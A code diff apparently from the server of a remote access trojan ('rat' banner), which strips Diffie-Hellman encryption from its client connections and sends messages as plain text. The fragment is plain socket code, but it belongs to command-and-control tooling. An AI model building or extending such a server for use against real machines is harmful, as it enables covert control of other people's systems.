@@ -11,9 +11,6 @@ import socket
 import sys
 import threading
 
-from core.crypto import encrypt, decrypt, diffiehellman
-
-
 # ascii banner (Crawford2) - http://patorjk.com/software/taag/
 # ascii rat art credit - http://www.ascii-art.de/ascii/pqr/rat.txt
 BANNER = '''
@@ -63,25 +60,26 @@ class Server(threading.Thread):
     def run(self):
         while True:
             conn, addr = self.s.accept()
-            dhkey = diffiehellman(conn)
             client_id = self.client_count
-            client = ClientConnection(conn, addr, dhkey, uid=client_id)
+            client = ClientConnection(conn, addr, uid=client_id)
             self.clients[client_id] = client
             self.client_count += 1
 
     def send_client(self, message, client):
         try:
-            enc_message = encrypt(message, client.dhkey)
-            client.conn.send(enc_message)
+            client.conn.send(message.encode("utf-8"))
         except Exception as e:
-            print('Error: {}'.format(e))
+            print(f"Error: {e}")
+
 
     def recv_client(self, client):
         try:
             recv_data = client.conn.recv(4096)
-            print(decrypt(recv_data, client.dhkey))
+            message = recv_data.decode("utf-8")
+            print(message)
         except Exception as e:
-            print('Error: {}'.format(e))
+            print(f"Error: {e}")
+
 
     def select_client(self, client_id):
         try:
